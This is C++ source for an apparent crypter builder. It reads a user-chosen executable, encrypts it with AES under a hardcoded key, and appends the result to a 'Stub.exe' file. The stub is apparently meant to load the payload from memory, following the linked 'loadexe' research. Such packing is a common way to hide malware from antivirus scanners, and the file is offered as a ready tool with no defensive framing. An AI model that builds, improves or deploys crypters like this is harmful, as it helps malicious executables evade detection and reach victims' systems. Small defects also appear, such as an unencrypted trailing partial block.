/**
Copyright (c) <2013, <Penguin>
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

The views and conclusions contained in the software and documentation are those
of the authors and should not be interpreted as representing official policies,
either expressed or implied, of the FreeBSD Project.
**/



/**
 * Research:
 * http://stackoverflow.com/questions/20365005/c-xor-encryption
 * http://www.security.org.sg/code/loadexe.html
 *
 * Credits:
 * -igitalNemesis
 * -Grigori Perelman
 * -MicroPenguin
 * -Original Unknown
 * -Joe Z          (http://stackoverflow.com/users/2354107/joe-z)
 * */


#pragma warning (disable:4996)
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <vector>
#include <string>
#include "VirtualAES\VirtualAES.h"
#include <Windows.h>
#include <TlHelp32.h>

using namespace std;

char * FB; //The Buffer that will store the File's data
DWORD fs; // We will store the File size here
char output[MAX_PATH];
char choice;
DWORD dwBytesWritten = 0;
char name[MAX_PATH];   // We will store the Name of the Crypted file here

std::vector<char> file_data;  // With your current program, make this a global.

void RDF() //The Function that Reads the File and Copies the stub
{
	DWORD bt;

	cout << "Please enter the Path of the file \nIf the file is in the same folder as the builder\nJust type the file name with an extention\nEG: Stuff.exe\n";
	cout << "File Name: ";
	cin >> name; // Ask for input from the user and store that inputed value in the name variable
	cout << "Enter output name: ";
	cin >> output;
}



void choose_enc()
{
	//Asks users for encryption method
	cout << "\n\nChoose encryption method: " << endl;
	cout << "1. N/A" << endl;
	cout << "2. Simple AES" << endl;
	cin >> choice;
}


void AESEncrypt(char* rawData, int size)
{
    //256 Bit Key
    unsigned char key[KEY_256] = "Zr4u7x!A%D*G-KaPdSgUkXp2s5v8y/B";

    unsigned char plaintext[BLOCK_SIZE];
    unsigned char ciphertext[BLOCK_SIZE];

    aes_ctx_t* ctx;
    virtualAES::initialize();
    ctx = virtualAES::allocatectx(key, sizeof(key));

    int count = 0;
    int index = size/16; //Outer loop range
    int innerCount = 0;
    int innerIndex = 16; //We encrypt&copy 16 Bytes for once.
    int dataIndex = 0; //Non resetting @rawData index for encryption
    int copyIndex = 0; //Non resetting @rawData index for copying encrypted data.

    /*
     * Our Block Size 16 Byte. Outer loop range has to be executablesize/16.
     *
     * First we store first 16 byte of our executable into @plaintext
     * We encrypt @plaintext.
     * @rawData index shouldnt be reset to 0. So @dataCount variable always increasing.
     * Thus @rawData always be like @rawData[16, 32, 64, 128 ... @executablesize]
     *
     * After encryption we copy the encrypted data into @rawData.
     * Again we use special index(@copyCount) which it never be reset to 0.
     */

    for(count; count < index; count++)
    {
        for(innerCount = 0; innerCount < innerIndex; innerCount++)
        {
            plaintext[innerCount] = rawData[dataIndex];
            dataIndex++;
        }

        virtualAES::encrypt(ctx, plaintext, ciphertext);

        for(innerCount = 0; innerCount < innerIndex; innerCount++)
        {
            rawData[copyIndex] = ciphertext[innerCount];
            copyIndex++;
        }
    }

    delete ctx;
}

int encrypt()
{
    std::ifstream data(name, std::ios::binary);		//Open

    data.seekg(0, data.end);							//Go eof
	long datasize = static_cast<long>(data.tellg());	//Get Size
    char *rawData = new char[datasize];

    printf("Size of file %ld\n", data.tellg());

    cout << "Opening...\n"<< name;

    if (!data.is_open())
	{
        cout << "Error opening...\n"<< name;
		return -1;
	}

	data.seekg(0);
	data.read(rawData, datasize);
	data.close();

    fstream built(output, ios::binary | ios::out);

    cout << "Opening...\n"<< output;

    if (!built.is_open())
	{
        cout << "Error opening...\n"<< output;
		return -1;
	}

    char filename[]= "Stub.exe";

	std::ifstream file(filename, std::ios::binary);

	cout << "Opening...\n"<< filename;

	if (!file.is_open())
	{
        cout << "Error opening...\n"<< filename;
		return -1;
	}

    file.seekg(0, file.end);

	long stubsize = static_cast<long>(file.tellg());

	printf("Size of file %ld\n", file.tellg());


    file.seekg(0);

    char *stubData = new char[stubsize];

	file.read(stubData, stubsize);
    file.close();

    for(auto i = 0; i < stubsize; i++)
    {
        built << stubData[i];
    }


    AESEncrypt(rawData, datasize);

    for(auto i = 0; i < datasize; i++)
    {
        built << rawData[i];
    }
    built.close();

    return 0;

}


int main() // The main function (Entry point)
{
	RDF(); //Read the file
	//choose_enc();
	cout << "Opening...\n";
	encrypt();
}


